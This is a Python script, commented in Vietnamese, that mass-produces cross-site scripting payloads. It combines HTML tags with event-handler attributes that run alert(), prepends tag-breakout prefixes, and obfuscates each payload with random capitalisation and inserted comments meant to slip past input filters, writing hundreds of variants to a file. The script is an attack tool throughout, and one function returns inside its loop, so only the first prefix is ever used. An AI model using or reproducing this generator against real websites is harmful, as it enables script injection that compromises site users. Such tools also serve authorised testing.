import random

prefix = [r"'>\"", r'\">', r'<"', r'><', r'>"<', r'.\>"</.', r'./>%20<./', r'/>%20<', r'%20/%20>', r'%20">%20<', r'%3E%3C', r'Pjw=']
# Danh sách các tag HTML phổ biến và thuộc tính phù hợp với từng tag
tags_properties = {
    'img': ['src', 'onerror', 'alt'],
    'script': ['src', 'type'],
    'svg': ['onload', 'onmouseover', 'style'],
    'iframe': ['src', 'onload'],
    'body': ['onload', 'onerror'],
    'input': ['value', 'onfocus', 'onchange'],
    'form': ['action', 'onsubmit'],
    'video': ['src', 'autoplay', 'onplay'],
    'audio': ['src', 'autoplay', 'onplay']
}

# Danh sách các thuộc tính sự kiện có thể kích hoạt XSS
event_attributes = [
    'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onchange', 'onblur', 'onsubmit',
    'oninput', 'onkeydown', 'onkeyup', 'onpaste', 'onselect','ontoggle'
]

# Danh sách các thuộc tính bổ sung có thể dùng
additional_attributes = [
     'on', 'only', 'autofocus', 'autoplay','popover'
]

# Danh sách các thuộc tính phụ (sub-attributes) có thể dùng
sub_attributes = [
    'data-info', 'data-xss', 'data-custom', 'data-test'
]

def random_uppercase(s):
    """Chuyển một số chữ cái trong chuỗi thành chữ hoa ngẫu nhiên."""
    s_list = list(s)
    indices = random.sample(range(len(s_list)), max(1, len(s_list) // 3))  # Chọn ngẫu nhiên các chỉ số để in hoa
    for index in indices:
        s_list[index] = s_list[index].upper()
    return ''.join(s_list)

def add_obfuscation(payload):
    comments = ['/**/', '/*comment*/', '/*xss*/']
    # Chèn comment ngẫu nhiên vào các vị trí khác nhau của payload
    obfuscated_payload = payload
    for _ in range(random.randint(1, 3)):  # Chèn 1-3 comment vào payload
        comment = random.choice(comments)
        position = random.randint(0, len(obfuscated_payload) - 1)
        obfuscated_payload = obfuscated_payload[:position] + comment + obfuscated_payload[position:]
    return obfuscated_payload
def generate_payload():
    tag = random.choice(list(tags_properties.keys()))
    properties = tags_properties[tag]
    event_attr = random.choice(event_attributes)
    additional_attr = random.choice(additional_attributes)
    sub_attr = random.choice(sub_attributes)
    property_attr = random.choice(properties)
    if tag in ['script', 'iframe', 'svg']:
        payload = f"<{tag} {event_attr}='alert(1)' {property_attr}='value' {additional_attr}></{tag}>"
    elif tag in ['video', 'audio']:
        payload = f"<{tag} {additional_attr} {event_attr}='alert(2)' {property_attr}='value' {sub_attr}='test'></{tag}>"
    else:
        payload = f"<{tag} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='test' />"

    # Áp dụng tính năng in hoa cho một số chữ cái trong payload
    payload = random_uppercase(payload)
    # Thêm tính năng obfuscate bằng comment
    payload = add_obfuscation(payload)
    
    return payload

def generate_payload_bracket():
    tag = random.choice(list(tags_properties.keys()))
    properties = tags_properties[tag]
    event_attr = random.choice(event_attributes)
    additional_attr = random.choice(additional_attributes)
    sub_attr = random.choice(sub_attributes)
    property_attr = random.choice(properties)
    for pr in prefix:
        if tag in ['script', 'iframe', 'svg']:
            payload = f"{pr}<{tag} {event_attr}='alert(1)' {property_attr}='value' {additional_attr}></{tag}>"
        elif tag in ['video', 'audio']:
            payload = f"{pr}<{tag} {additional_attr} {event_attr}='alert(2)' {property_attr}='value' {sub_attr}='test'></{tag}>"
        else:
            payload = f"{pr}<{tag} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='test' />"

        # Áp dụng tính năng in hoa cho một số chữ cái trong payload
        payload = random_uppercase(payload)
        # Thêm tính năng obfuscate bằng comment
        payload = add_obfuscation(payload)
        
        return payload

def save_payloads_to_file(filename='payloads.txt', num_payloads=200):
    """Lưu các payload vào tệp."""
    with open(filename, 'w') as file:
        for _ in range(num_payloads):
            payload = generate_payload()
            payload_pr = generate_payload_bracket()
            file.write(payload + '\n')
            file.write(payload_pr + '\n')
    print(f'Saved {num_payloads} payloads to {filename}')

def main():
    save_payloads_to_file()

if __name__ == "__main__":
    main()